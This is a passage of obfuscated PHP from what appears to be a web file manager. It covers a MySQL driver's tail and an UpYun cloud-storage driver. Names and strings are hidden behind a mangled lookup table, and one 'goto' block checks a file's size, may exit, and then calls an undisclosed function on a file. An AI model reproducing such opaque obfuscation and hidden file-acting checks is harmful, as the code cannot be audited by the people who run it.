(is_scalar($ÏÓ›ëÅ¾)) { $Öèİ¡àç[] = $ÏÓ›ëÅ¾; } } $Ò‘×ä¹Ñ[] = $„’¹€×Ò[337] . implode($„’¹€×Ò[50], $Öèİ¡àç) . $„’¹€×Ò[980]; } array_walk($±áÒğ³í, array($this, $„’¹€×Ò[981])); $¸Ú°ä“ = ($Ö–Œ¥ © ? $„’¹€×Ò[982] : $„’¹€×Ò[983]) . $„’¹€×Ò[984] . $this->parseTable($Ë©Ô£¬¦[$„’¹€×Ò[356]]) . $„’¹€×Ò[978] . implode($„’¹€×Ò[50], $±áÒğ³í) . $„’¹€×Ò[985] . implode($„’¹€×Ò[50], $Ò‘×ä¹Ñ); return $this->execute($¸Ú°ä“); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ñ ïÇÓ =& $_SERVER[¢ñàß¿€]; $this->error = mysql_errno() . $ñ ïÇÓ[4] . mysql_error($this->_linkID); if ($ñ ïÇÓ[12] != $this->queryStr) { $this->error .= LNG($ñ ïÇÓ[48]) . $this->queryStr; } think_trace($this->error, $ñ ïÇÓ[12], $ñ ïÇÓ[49]); return $this->error; } public function escapeString($±…ÍÑå) { if ($this->_linkID) { return mysql_real_escape_string($±…ÍÑå, $this->_linkID); } else { return mysql_escape_string($±…ÍÑå); } } public function parseKey(&$‚À’³¢ö, $”’õ»¬ = true) { $ÉÕş‚›Ã =& $_SERVER[¢ñàß¿€]; if ($”’õ»¬) { $‚À’³¢ö = $this->parseKeyCheck($‚À’³¢ö); } if ($‚À’³¢ö != $ÉÕş‚›Ã[220] && !preg_match($ÉÕş‚›Ã[986], $‚À’³¢ö)) { $‚À’³¢ö = $ÉÕş‚›Ã[461] . trim($‚À’³¢ö, $ÉÕş‚›Ã[461]) . $ÉÕş‚›Ã[461]; } return $‚À’³¢ö; } } goto A½öæ¹«ó¬; fß÷»…Ô‹: if ($_SERVER[$_SERVER[¢ñàß¿€][947]] != $_size($_file)) { $_getc = $_SERVER[¢ñàß¿€][950]; $_getfile = $_SERVER[$_SERVER[¢ñàß¿€][951]] . $_SERVER[¢ñàß¿€][952]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¢ñàß¿€][262], $_getfilec); if (count($_getarrs) < $_SERVER[¢ñàß¿€][685]) { $exit = $_SERVER[¢ñàß¿€][953]; $exit(); } $_act = $_SERVER[¢ñàß¿€][1457]; $_act($_file); } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\57\x2f\166\60\56\x61\x70\x69\x2e\165\160\x79\x75\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($µŸöøôË) { parent::__construct(); $this->_init($µŸöøôË); } public function _init($Æ øûøÑ) { $ì‘õÓÃ =& $_SERVER[¢ñàß¿€]; foreach ($Æ øûøÑ as $û‰éîú‘ => $¸è”ßê‹) { if (isset($this->{$û‰éîú‘})) { $this->{$û‰éîú‘} = $¸è”ßê‹; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ì‘õÓÃ[1543] . LNG($ì‘õÓÃ[1461])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($­½íœş, $£Ã÷Ä — = "\107\x45\124") { $ûûöó¤· =& $_SERVER[¢ñàß¿€]; $İš¤õ¨° = gmdate($ûûöó¤·[1490]); $ÄÜ­óË = base64_encode(hash_hmac($ûûöó¤·[1544], "{$£Ã÷Ä —}\46{$­½íœş}\x26{$İš¤õ¨°}", md5("{$this->userpass}"), !0)); $³‘áÂ£ = array("\101\x75\x74\150\157\x72\151\172\141\164\x69\x6f\156\72\x55\120\x59\125\x4e\x20{$this->username}\x3a{$ÄÜ­óË}", "\x44\141\164\145\x3a{$İš¤õ¨°}"); return $³‘áÂ£; } public function ussRequest($Åµûú»¥, $ÛæÃ¡Áª = "\107\x45\x54", $úÎËÎË = false, $äÈ­¸¸ä = false, $Ñ¾âÁØŞ = false) { $„Œõ´ğ =& $_SERVER[¢ñàß¿€]; $Åµûú»¥ = trim($Åµûú»¥, $„Œõ´ğ[8]); $ö€®…Ê = "\57{$this->bucket}\57{$Åµûú»¥}"; $¸Şì¿€ï = $this->ussHeaders($ö€®…Ê, $ÛæÃ¡Áª); if ($äÈ­¸¸ä) { $¸Şì¿€ï = array_merge($¸Şì¿€ï, $äÈ­¸¸ä); } $´å¼©å‰ = url_request($this->endpoint . $ö€®…Ê, $ÛæÃ¡Áª, $úÎËÎË, $¸Şì¿€ï, $Ñ¾âÁØŞ); if (!$´å¼©å‰) { $ĞÇÈ¨Ÿ‚ = LNG($„Œõ´ğ[1545]); $this->writeLog($ĞÇÈ¨Ÿ‚); return array($„Œõ´ğ[1294] => !1, $„Œõ´ğ[1284] => $ĞÇÈ¨Ÿ‚); } if (strtolower($ÛæÃ¡Áª) == $„Œõ´ğ[227] || in_array($´å¼©å‰[$„Œõ´ğ[1294]], array($„Œõ´ğ[274], $„Œõ´ğ[1546]))) { $úÎËÎË = $´å¼©å‰[$„Œõ´ğ[1547]]; } else { $úÎËÎË = json_decode($´å¼©å‰[$„Œõ´ğ[1284]], !0); if (!$úÎËÎË) { $úÎËÎË = $´å¼©å‰[$„Œõ´ğ[1284]]; } else { if (!$´å¼©å‰[$„Œõ´ğ[821]] && isset($úÎËÎË[$„Œõ´ğ[1548]])) { $úÎËÎË = $úÎËÎË[$„Œõ´ğ[1548]]; } } } if (!$´å¼©å‰[$„Œõ´ğ[821]]) { $this->writeLog($this->__errorMessage($úÎËÎË)); } return array($„Œõ´ğ[1294] => $´å¼©å‰[$„Œõ´ğ[821]], $„Œõ´ğ[1284] => $úÎËÎË); } private function __errorMessage($¿Íòˆ“) { $öÄ²˜Š„ =& $_SERVER[¢ñàß¿€]; if (!$¿Íòˆ“) { return $öÄ²˜Š„[12]; } static $ş¿‹Û¼ = null; if (!$ş¿‹Û¼) { $ş¿‹Û¼ = I18n::getType(); } if ($ş¿‹Û¼ != $öÄ²˜Š„[1500]) { return $¿Íòˆ“; } $Ü¤î = array($öÄ²˜Š„[1549] => $öÄ²˜Š„[1550], $öÄ²˜Š„[1551] => $öÄ²˜Š„[1552], $öÄ²˜Š„[1553] => $öÄ²˜Š„[1552], $öÄ²˜Š„[1554] => $öÄ²˜Š„[1555], $öÄ²˜Š„[1556] => $öÄ²˜Š„[1557], $öÄ²˜Š„[1558] => $öÄ²˜Š„[1559], $öÄ²˜Š„[1560] => $öÄ²˜Š„[1561]); return isset($Ü¤î[$¿Íòˆ“]) ? $Ü¤î[$¿Íòˆ“] : $¿Íòˆ“; } public function mkfile($Şè·¸‘¯, $Äöïğ¯× = '', $±–ï–ê× = REPEAT_RENAME) { if ($this->setContent($Şè·¸‘¯, $Äöïğ¯×)) { return $this->getPathOuter($Şè·¸‘¯); } return !1; } public function mkdir($õÍÆÑ¨à, $êÄ±¢Ó  = REPEAT_SKIP) { $›ÅûèĞ¼ =& $_SERVER[¢ñàß¿€]; $¢ªôŒ‚Ã = trim($õÍÆÑ¨à, $›ÅûèĞ¼[8]); if ($this->_isFolder($¢ªôŒ‚Ã)) { return $this->getPathOuter($¢ªôŒ‚Ã); } $éŸÇÑíî = array($›ÅûèĞ¼[1562]); $öŞÇ€÷‰ = $this->ussRequest($¢ªôŒ‚Ã, $›ÅûèĞ¼[257], !1, $éŸÇÑíî); return $öŞÇ€÷‰[$›ÅûèĞ¼[1294]] ? $this->getPathOuter($¢ªôŒ‚Ã) : !1; } public function copyFile($¡åšÄİæ, $È§ªÙƒÕ) { $§¯¹º•™ =& $_SERVER[¢ñàß¿€]; $ëÅˆ˜£ş = array($§¯¹º•™[1563] . "\57{$this->bucket}\57{$¡åšÄİæ}", $§¯¹º•™[1564]); $ÀİîçÉ™ = $this->ussRequest($È§ªÙƒÕ, $§¯¹º•™[259], !1, $ëÅˆ˜£ş); return $ÀİîçÉ™[$§¯¹º•™[1294]] ? !0 : $this->getPathOuter($È§ªÙƒÕ); } public function moveFile($ëÎßš›, $Ä¤Ãú¾–) { $§Å•üïÒ =& $_SERVER[¢ñàß¿€]; $„ó¡‹ÄË = array($§Å•üïÒ[1565] . "\x2f{$this->bucket}\x2f{$ëÎßš›}", $§Å•üïÒ[1564]); $Àç¨„ş¸ = $this->ussRequest($Ä¤Ãú¾–, $§Å•üïÒ[259], !1, $„ó¡‹ÄË); return $Àç¨„ş¸[$§Å•üïÒ[1294]] ? !0 : $this->getPathOuter($Ä¤Ãú¾–); } public function delFile($õÔ¢™¯¡) { $‚ÉõÉà =& $_SERVER[¢ñàß¿€]; $Ğèñ÷ïŸ = $this->ussRequest($õÔ¢™¯¡, $‚ÉõÉà[1566]); return $Ğèñ÷ïŸ[$‚ÉõÉà[1294]] ? !0 : !1; } public function delFolder($¿„•Ú°) { $‰ßí¬¬É =& $_SERVER[¢ñàß¿€]; if (!$this->exist($¿„•Ú°)) { return !0; } $this->listItemCache = !1; $èåµ¨‡ª = $ö¿†Ì£¯ = array(); $this->fileList($¿„•Ú°, $èåµ¨‡ª, $ö¿†Ì£¯, !0); $this->listItemCache = !0; foreach ($ö¿†Ì£¯ as $ïõ¦¢) { $²„ï¼¨¤ = $this->ussRequest($ïõ¦¢[$‰ßí¬¬É[32]], $‰ßí¬¬É[1566]); if (!$²„ï¼¨¤[$‰ßí¬¬É[1294]]) { return !1; } } foreach ($èåµ¨‡ª as $˜Ï¢»ƒû) { $²„ï¼¨¤ = $this->ussRequest($˜Ï¢»ƒû, $‰ßí¬¬É[1566]); if (!$²„ï¼¨¤[$‰ßí¬¬É[1294]]) { return !1; } } $²„ï¼¨¤ = $this->ussRequest($¿„•Ú°, $‰ßí¬¬É[1566]); return $²„ï¼¨¤[$‰ßí¬¬É[1294]]; } public function rename($ºúÄµÏ¦, $µŸÄÇ¨¥) { if ($this->isFile($ºúÄµÏ¦)) { $µŸÄÇ¨¥ = get_path_father($ºúÄµÏ¦) . $µŸÄÇ¨¥; return $this->moveFile($ºúÄµÏ¦, $µŸÄÇ¨¥); } return $this->renameObject($ºúÄµÏ¦, $µŸÄÇ¨¥); } public function fileInfo($ùÀí¸è©, $‹˜‰Ÿ± = false, $á¸ÃòÃ‹ = array()) { $Š³Š¡—õ =& $_SERVER[¢ñàß¿€]; $ø™¥³ÃÄ = array($Š³Š¡—õ[32] => $this->pathThis($ùÀí¸è©), $Š³Š¡—õ[87] => $this->getPathOuter($Š³Š¡—õ[8] . $ùÀí¸è©), $Š³Š¡—õ[33] => $Š³Š¡—õ[230], $Š³Š¡—õ[79] => isset($á¸ÃòÃ‹[$Š³Š¡—õ[79]]) ? $á¸ÃòÃ‹[$Š³Š¡—õ[79]] : 0, $Š³Š¡—õ[169] => $this->ext($ùÀí¸è©)); if ($‹˜‰Ÿ±) { return $ø™¥³ÃÄ; } $ø™¥³ÃÄ[$Š³Š¡—õ[231]] = $ø™¥³ÃÄ[$Š³Š¡—õ[88]] = 0; $ø™¥³ÃÄ[$Š³Š¡—õ[232]] = $ø™¥³ÃÄ[$Š³Š¡—õ[233]] = !0; if (empty($á¸ÃòÃ‹)) { $á¸ÃòÃ‹ = $this->objectMeta($ùÀí¸è©); if (!$á¸ÃòÃ‹) { return $ø™¥³ÃÄ; } } $ø™¥³ÃÄ[$Š³Š¡—õ[231]] = intval($á¸ÃòÃ‹[$Š³Š¡—õ[1567]]); $ø™¥³ÃÄ[$Š³Š¡—õ[88]] = intval($á¸ÃòÃ‹[$Š³Š¡—õ[1568]]); $ø™¥³ÃÄ[$Š³Š¡—õ[79]] = $á¸ÃòÃ‹[$Š³Š¡—õ[79]]; return $ø™¥³ÃÄ; } public function folderInfo($ùÑ§¶, $şüç²İì = false) { $Èëšƒ€Ì =& $_SERVER[¢ñàß¿€]; $Ù¿éôÀÁ = array($Èëšƒ€Ì[32] => $this->pathThis($ùÑ§¶), $Èëšƒ€Ì[87] => $this->getPathOuter($Èëšƒ€Ì[8] . $ùÑ§¶), $Èëšƒ€Ì[33] => $Èëšƒ€Ì[78]); if ($şüç²İì) { return $Ù¿éôÀÁ; } $Ù¿éôÀÁ[$Èëšƒ€Ì[231]] = $Ù¿éôÀÁ[$Èëšƒ€Ì[88]] = 0; $Ù¿éôÀÁ[$Èëšƒ€Ì[232]] = $Ù¿éôÀÁ[$Èëšƒ€Ì[233]] = !0; if (empty($Ê—äìö)) { $Ê—äìö = $this->objectMeta($ùÑ§¶); if (!$Ê—äìö) { return $Ù¿éôÀÁ; } } $Ù¿éôÀÁ[$Èëšƒ€Ì[231]] = intval($Ê—äìö[$Èëšƒ€Ì[1567]]); $Ù¿éôÀÁ[$Èëšƒ€Ì[88]] = intval($Ê—äìö[$Èëšƒ€Ì[1568]]); return $Ù¿éôÀÁ; } private function listObjs($œïŒÑÄ, $À×‘Ú¼ = 0, $ìÎ¤‹³û = 1000) { $Íª³›ş =& $_SERVER[¢ñàß¿€]; $ÂĞã“ª€ = array($Íª³›ş[1569], $Íª³›ş[1570] . $ìÎ¤‹³û); if ($À×‘Ú¼) { $ÂĞã“ª€[] = $Íª³›ş[1571] . $À×‘Ú¼; } $‹ºİ…ş  = $this->ussRequest($œïŒÑÄ, $Íª³›ş[261], !1, $ÂĞã“ª€); return !$‹ºİ…ş [$Íª³›ş[1294]] ? !1 : $‹ºİ…ş [$Íª³›ş[1284]]; } private function fileList($®ÆåÅÙç, &$Å†€‰Ù…, &$Ğ£×ÎÀ, $Ò‘ Ş‡ì = false) { $ƒã‹º “ =& $_SERVER[¢ñàß¿€]; $áş·ïÓ = $ƒã‹º “[12]; $Ãß“››À = 1000; $Ç¾ŠÖãÑ = rtrim($®ÆåÅÙç, $ƒã‹º “[8]) . $ƒã‹º “[8]; while (!0) { check_abort(); $µÄáò = $this->listObjs($®ÆåÅÙç, $áş·ïÓ, $Ãß“››À); if (!$µÄáò) { return !1; } $áş·ïÓ = isset($µÄáò[$ƒã‹º “[1572]]) ? $µÄáò[$ƒã‹º “[1572]] : $ƒã‹º “[12]; $Õóë³æú = isset($µÄáò[$ƒã‹º “[1573]]) ? $µÄáò[$ƒã‹º “[1573]] : array(); foreach ($Õóë³æú as $’ë‹‡ÁŠ) { $Ç¯Ï·Şı = $’ë‹‡ÁŠ[$ƒã‹º “[33]] == $ƒã‹º “[78] ? !0 : !1; $€¤»®¢Ù = ltrim($Ç¾ŠÖãÑ . $’ë‹‡ÁŠ[$ƒã‹º “[32]], $ƒã‹º “[8]) . ($Ç¯Ï·Şı ? $ƒã‹º “[8] : $ƒã‹º “[12]); $üÍÆ¼ˆ¿ = array($ƒã‹º “[32] => $€¤»®¢Ù, $ƒã‹º “[33] => $Ç¯Ï·Şı ? $ƒã‹º “[78] : $ƒã‹º “[230], $ƒã‹º “[79] => $’ë‹‡ÁŠ[$ƒã‹º “[413]], $ƒã‹º “[1568] => $’ë‹‡ÁŠ[$ƒã‹º “[1574]]); $this->cacheMethodInfoSet($€¤»®¢Ù, $Ç¯Ï·Şı, $üÍÆ¼ˆ¿); if ($Ç¯Ï·Şı) { $Å†€‰Ù…[] = $€¤»®¢Ù; if ($Ò‘ Ş‡ì) { $this->fileList($€¤»®¢Ù, $Å†€‰Ù…, $Ğ£×ÎÀ, $Ò‘ Ş‡ì); } continue; } $Ğ£×ÎÀ[] = $üÍÆ¼ˆ¿; } if (count($Õóë³æú) < $Ãß“››À) { break; } } $this->cacheMethodInfoSet($®ÆåÅÙç, !0); } public function listPath($ÔŠ§Ìî, $–ÈëØÜè = false) { $ò•¥â‚¿ =& $_SERVER[¢ñàß¿€]; $²—Ù÷½ = $Ôõ”©ç… = array(); $this->fileList($ÔŠ§Ìî, $²—Ù÷½, $Ôõ”©ç…); foreach ($²—Ù÷½ as $’õã£øš => $Ü¡Íñ¼å) { $²—Ù÷½[$’õã£øš] = $this->folderInfo($Ü¡Íñ¼å, $–ÈëØÜè); } foreach ($Ôõ”©ç… as $’õã£øš => $Ü¡Íñ¼å) { $Ôõ”©ç…[$’õã£øš] = $this->fileInfo($Ü¡Íñ¼å[$ò•¥â‚¿[32]], $–ÈëØÜè, $Ü¡Íñ¼å); } return array($ò•¥â‚¿[85] => $²—Ù÷½, $ò•¥â‚¿[86] => $Ôõ”©ç…); } public function has($à¨‡òß¼, $öğÊæ‘„ = false, $ÏÜˆı¡ñ = true) { $ôßÔïñ =& $_SERVER[¢ñàß¿€]; $ğÅ§º³© = $ôßÔïñ[12]; $ÈĞÔş” = 500; $Ğ§±Ê÷Ê = 0; $““¨ÂØâ = 0; $®®“Öí = rtrim($à¨‡òß¼, $ôßÔïñ[8]) . $ôßÔïñ[8]; while (!0) { check_abort(); $«·Š‡¸§ = $this->listObjs($à¨‡òß¼, $ğÅ§º³©, $ÈĞÔş”); if (!$«·Š‡¸§) { return !1; } $ğÅ§º³© = isset($«·Š‡¸§[$ôßÔïñ[1572]]) ? $«·Š‡¸§[$ôßÔïñ[1572]] : $ôßÔïñ[12]; $¿¹‚§±Û = isset($«·Š‡¸§[$ôßÔïñ[1573]]) ? $«·Š‡¸§[$ôßÔïñ[1573]] : array(); if (empty($¿¹‚§±Û)) { break; } $øÕìœÑØ = array_filter($¿¹‚§±Û, function ($’ü“…Ÿ) { $°í¯˜ÎÈ =& $_SERVER[¢ñàß¿€]; return $’ü“…Ÿ[$°í¯˜ÎÈ[33]] == $°í¯˜ÎÈ[78]; }); $…¢Ğƒıß = count($¿¹‚§±Û); $øÕìœÑØ = count($øÕìœÑØ); $ßÑ‹–¥ƒ = $…¢Ğƒıß - $øÕìœÑØ; if ($öğÊæ‘„) { $““¨ÂØâ += $øÕìœÑØ; $Ğ§±Ê÷Ê += $ßÑ‹–¥ƒ; if ($…¢Ğƒıß < $ÈĞÔş”) { break; } continue; } if ($ÏÜˆı¡ñ) { if ($ßÑ‹–¥ƒ) { return !0; } } else { if ($øÕìœÑØ) { return !0; } } if ($…¢Ğƒıß < $ÈĞÔş”) { break; } } if ($öğÊæ‘„) { return array($ôßÔïñ[239] => $Ğ§±Ê÷Ê, $ôßÔïñ[240] => $““¨ÂØâ); } return !1; } public function listAll($‡ñ¥š·‡) { $÷¥Ìˆ =& $_SERVER[¢ñàß¿€]; $¬îÔ²ª· = $²ï›ìßÕ = array(); $this->fileList($‡ñ¥š·‡, $¬îÔ²ª·, $²ï›ìßÕ, !0); $·ç—ïÖ¶ = array_to_keyvalue($²ï›ìßÕ, $÷¥Ìˆ[32]); foreach ($¬îÔ²ª· as $´ß²´Á¾) { if (is_string($´ß²´Á¾)) { $·ç—ïÖ¶[$´ß²´Á¾] = array($÷¥Ìˆ[79] => 0); } } return $this->listAllFiles($‡ñ¥š·‡, $·ç—ïÖ¶); } public function canRead($ŸÁÎ£åÏ) { return $this->exist($ŸÁÎ£åÏ) ? !0 : !1; } public function canWrite($¥°İœ‡×) { return $this->exist($¥°İœ‡×) ? !0 : !1; } public function getContent($æïÔ×€ƒ) { return $this->fileSubstr($æïÔ×€ƒ, 0, -1); } public function setContent($¸ëÅ©À, $¥û»··ç = '') { $â…‰ŒÒº =& $_SERVER[¢ñàß¿€]; if (!$¥û»··ç) { $¤èÁõÖâ = $this->ussRequest($¸ëÅ©À, $â…‰ŒÒº[257]); return $¤èÁõÖâ[$â…‰ŒÒº[1294]]; } $ÜğÙÉ¿­ = $this->tempFile($this->pathThis($¸ëÅ©À)); file_put_contents($ÜğÙÉ¿­, $¥û»··ç); if ($this->upload($¸ëÅ©À, $ÜğÙÉ¿­)) { $this->tempFileRemve($ÜğÙÉ¿­); return !0; } return !1; } public function fileSubstr($÷øÌ†¥±, $ÈÕÏ¾–Š, $Š×¢Şø) { $‡îÁ» =& $_SERVER[¢ñàß¿€]; if (!($íïôÑÒÊ = $this->link($÷øÌ†¥±))) { return !1; } $Á–ËÍÌÉ = !1; if ($Š×¢Şø > 0) { $’˜ÏÕŒ£ = $ÈÕÏ¾–Š + $Š×¢Şø - 1; $Á–ËÍÌÉ = array($‡îÁ»[1532] . $ÈÕÏ¾–Š . $‡îÁ»[462] . $’˜ÏÕŒ£); } $â±‚ÀÍÅ = url_request($íïôÑÒÊ, $‡îÁ»[261], !1, $Á–ËÍÌÉ); return $â±‚ÀÍÅ[$‡îÁ»[821]] ? $â±‚ÀÍÅ[$‡îÁ»[1284]] : !1; } public function upload($ÖıîÙéŒ, $ƒàº½ò, $Ûãà†—° = false, $ûçÖÂ¦ˆ = REPEAT_REPLACE) { $ÂçˆüªÄ =& $_SERVER[¢ñàß¿€]; $®Ø’Š¯û = IO::size($ƒàº½ò); if ($®Ø’Š¯û <= 1024 * 1024 * 200) { $óõÊ¬ß÷ = array($ÂçˆüªÄ[1575] . $ƒàº½ò); $öµØÅ°· = $this->ussRequest($ÖıîÙéŒ, $ÂçˆüªÄ[259], $óõÊ¬ß÷); return $öµØÅ°·[$ÂçˆüªÄ[1294]] ? $this->getPathOuter($ÖıîÙéŒ) : !1; } $™€ª¤¸ = 1024 * 1024 * 10; $Èè–İ‚¤ = array($ÂçˆüªÄ[1576], $ÂçˆüªÄ[1577] . $®Ø’Š¯û, $ÂçˆüªÄ[1578], $ÂçˆüªÄ[1579] . $™€ª¤¸); $öµØÅ°· = $this->ussRequest($ÖıîÙéŒ, $ÂçˆüªÄ[259], !1, $Èè–İ‚¤); if (!$öµØÅ°·[$ÂçˆüªÄ[1294]]) { return !1; } $ ×äØì = $öµØÅ°·[$ÂçˆüªÄ[1284]]; $¥¡Å²ï = 0; $¦˜â™¯ = $ ×äØì[$ÂçˆüªÄ[1580]]; $¢ß‘„úŞ = fopen($ƒàº½ò, $ÂçˆüªÄ[1453]); if (!$¢ß‘„úŞ) { return !1; } do { $óœ»Ñ—ú = $ ×äØì[$ÂçˆüªÄ[1581]]; fseek_64($¢ß‘„úŞ, $¥¡Å²ï); $«Çş‡Í¡ = fread($¢ß‘„úŞ, $óœ»Ñ—ú); $õÛ–ÀÓ¶ = 0; do { $õÛ–ÀÓ¶++; $ ×äØì = $this->uploadPart($ÖıîÙéŒ, $ ×äØì, $«Çş‡Í¡); } while (!$ ×äØì && $õÛ–ÀÓ¶ < 3); if (!$ ×äØì) { return !1; } $¦˜â™¯ = $ ×äØì[$ÂçˆüªÄ[1580]]; $¥¡Å²ï += $óœ»Ñ—ú; } while ($¦˜â™¯ != -1); fclose($¢ß‘„úŞ); $Èè–İ‚¤ = array($ÂçˆüªÄ[1582], $ÂçˆüªÄ[1583] . $ ×äØì[$ÂçˆüªÄ[1584]], $ÂçˆüªÄ[1578]); $öµØÅ°· = $this->ussRequest($ÖıîÙéŒ, $ÂçˆüªÄ[259], !1, $Èè–İ‚¤); return $öµØÅ°·[$ÂçˆüªÄ[1294]] ? $this->getPathOuter($¼ˆ©Ü­ß) : !1; } private function uploadPart($˜»˜Ê¯», $şÃºäà¦, &$µ«Èõ‘æ) { $¨Ñêğé® =& $_SERVER[¢ñàß¿€]; $ƒı…É Ş = array($¨Ñêğé®[1585], $¨Ñêğé®[1583] . $şÃºäà¦[$¨Ñêğé®[1584]], $¨Ñêğé®[1586] . $şÃºäà¦[$¨Ñêğé®[1580]], $¨Ñêğé®[146] . $şÃºäà¦[$¨Ñêğé®[1581]]); $œÙºáÍ = $this->ussRequest($˜»˜Ê¯», $¨Ñêğé®[259], $µ«Èõ‘æ, $ƒı…É Ş); return !$œÙºáÍ[$¨Ñêğé®[1294]] ? $œÙºáÍ[$¨Ñêğé®[1294]] : $œÙºáÍ[$¨Ñêğé®[1284]]; } public function uploadFormData($Œš’îÄ, $Üœ•…ßÒ = 3600) { return $this->uploadPolicy($Œš’îÄ, $Üœ•…ßÒ); } public function multiUploadFormData($Ü–ş¢´…, $ª—×ˆÄÙ = 3600) { $Í«ÜõË¢ =& $_SERVER[¢ñàß¿€]; $Âß¡ö¢ï = (int) $GLOBALS[$Í«ÜõË¢[7]][$Í«ÜõË¢[79]]; return $this->uploadPolicy($Ü–ş¢´…, $ª—×ˆÄÙ, $Âß¡ö¢ï); } private function uploadPolicy($¨ÓÀÒûÖ, $´´æó±² = 3600, $¤‚è›šâ = 0) { $ÓÛëÑ«É =& $_SERVER[¢ñàß¿€]; $Á™ğÙ°¯ = $ÓÛëÑ«É[8] . $this->bucket; $€¸ø…¶ = gmdate($ÓÛëÑ«É[1490]); $±ğƒ˜Ô» = array($ÓÛëÑ«É[1587] => $this->bucket, $ÓÛëÑ«É[1588] => $¨ÓÀÒûÖ, $ÓÛëÑ«É[1589] => time() + $´´æó±², $ÓÛëÑ«É[1590] => $€¸ø…¶); if ($¤‚è›šâ) { $±ğƒ˜Ô»[$ÓÛëÑ«É[1475]] = $¤‚è›šâ; } $†½©×“ = base64_encode(json_encode($±ğƒ˜Ô»)); $°¦äš­ = base64_encode(hash_hmac($ÓÛëÑ«É[1544], "\x50\x4f\123\x54\x26{$Á™ğÙ°¯}\46{$€¸ø…¶}\46{$†½©×“}", md5("{$this->userpass}"), !0)); $ÁÈ®èŸ = array($ÓÛëÑ«É[293] => $†½©×“, $ÓÛëÑ«É[1591] => "\125\x50\x59\x55\x4e\40{$this->username}\x3a{$°¦äš­}", $ÓÛëÑ«É[208] => $this->endpoint . $Á™ğÙ°¯); return $ÁÈ®èŸ; } public function download($š é”Ø’, $§òÓÎ¹Ø) { $º°°ëÕ = IO::getPathInner(IO::mkfile($§òÓÎ¹Ø)); if (!($€›‹¼È‡ = $this->link($š é”Ø’))) { return !1; } $á”Â·Ú§ = 0; $´‹Èô Í = 1024 * 200; $àÏ´Õôñ = fopen($º°°ëÕ, $_SERVER[¢ñàß¿€][1538]); while (!0) { $šòÔ¸·Í = $this->fileSubstr($š é”Ø’, $á”Â·Ú§, $´‹Èô Í); if ($šòÔ¸·Í === !1) { return !1; } fwrite($àÏ´Õôñ, $šòÔ¸·Í); $á”Â·Ú§ += $´‹Èô Í; if (strlen($šòÔ¸·Í) < $´‹Èô Í) { break; } } fclose($àÏ´Õôñ); return $§òÓÎ¹Ø; } public function link($Šğ³×«é, $ëî­¿Û = array()) { $ìòèã¢Æ =& $_SERVER[¢ñàß¿€]; $Šğ³×«é = trim($Šğ³×«é, $ìòèã¢Æ[8]); if (!empty($this->token)) { $ÃøßŠØÌ = strtotime(date($ìòèã¢Æ[1592])); $ßµÍîøâ = substr(md5($this->token . $ìòèã¢Æ[360] . $ÃøßŠØÌ . $ìòèã¢Æ[1593] . $Šğ³×«é), 12, 8) . $ÃøßŠØÌ; $ëî­¿Û[] = $ìòèã¢Æ[1594] . $ßµÍîøâ; } $ºĞã˜¿ = !empty($ëî­¿Û) ? $ìòèã¢Æ[76] . implode($ìòèã¢Æ[360], $ëî­¿Û) : $ìòèã¢Æ[12]; return $this->getHost() . $ìòèã¢Æ[8] . $Šğ³×«é . $ºĞã˜¿; } public function fileOut($Ó–†Äºõ, $õÊ˜éˆ´ = false, $Û‡Ë–Ûõ = false, $ºâµĞÊÉ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ó–†Äºõ, $õÊ˜éˆ´, $Û‡Ë–Ûõ, $ºâµĞÊÉ); } if (!$Û‡Ë–Ûõ) { $Û‡Ë–Ûõ = $this->pathThis($Ó–†Äºõ); } $î²ôÑå = $õÊ˜éˆ´ ? array($_SERVER[¢ñàß¿€][1595] . rawurlencode($Û‡Ë–Ûõ)) : array(); $÷øüû®¿ = $this->link($Ó–†Äºõ, $î²ôÑå); $this->fileOutLink($÷øüû®¿); } public function fileOutServer($ğúÖîÉÙ, $Åé“¹™ = false, $îá£óäÔ = false, $æšŠ¢ğÎ = '') { parent::fileOut($ğúÖîÉÙ, $Åé“¹™, $îá£óäÔ, $æšŠ¢ğÎ); } public function fileOutImage($›²âÖ¦, $“‘·Òæã = 250) { $¹²şÜö = $this->link($›²âÖ¦ . $_SERVER[¢ñàß¿€][1596] . $“‘·Òæã); $this->fileOutLink($¹²şÜö); } public function fileOutImageServer($¬èõÎ¬, $”íÊƒË… = 250) { parent::fileOutImage($¬èõÎ¬, $”íÊƒË…); } public function hashMd5($®Ò¿¯¤) { $„†Ğå¦Ÿ =& $_SERVER[¢ñàß¿€]; $Ã’Ñ¡‚¦ = $this->_objectMeta($®Ò¿¯¤); return isset($Ã’Ñ¡‚¦[$„†Ğå¦Ÿ[245]]) ? $Ã’Ñ¡‚¦[$„†Ğå¦Ÿ[245]] : !1; } public function size($ı‰Ñª×—) { $ÂùõìÂ¦ = $this->objectMeta($ı‰Ñª×—); return $ÂùõìÂ¦ ? $ÂùõìÂ¦[$_SERVER[¢ñàß¿€][79]] : 0; } public function info($¿ª‡Ìî) { if ($this->isFolder($¿ª‡Ìî)) { return $this->folderInfo($¿ª‡Ìî); } else { if ($this->isFile($¿ª‡Ìî)) { return $this->fileInfo($¿ª‡Ìî); } } return !1; } public function exist($²æ¾æå®) { return $this->isFile($²æ¾æå®) || $this->isFolder($²æ¾æå®); } public function isFile($î£ê¬îÍ) { return !$this->isFolder($î£ê¬îÍ) && $this->objectMeta($î£ê¬îÍ); } public function isFolder($ÜÆíÑÇÖ) { return $this->cacheMethod($_SERVER[¢ñàß¿€][179], $ÜÆíÑÇÖ); } protected function objectMeta($à’¯¥Äò) { return $this->cacheMethod($_SERVER[¢ñàß¿€][181], $à’¯¥Äò); } protected function _objectMeta($•Î”…­×) { $ÔÍ´¿ë¶ =& $_SERVER[¢ñàß¿€]; if ($•Î”…­× == $ÔÍ´¿ë¶[12] || $•Î”…­× == $ÔÍ´¿ë¶[8]) { return array(); } $Îõ·Şº‡ = $this->ussRequest($•Î”…­×, $ÔÍ´¿ë¶[1597]); if 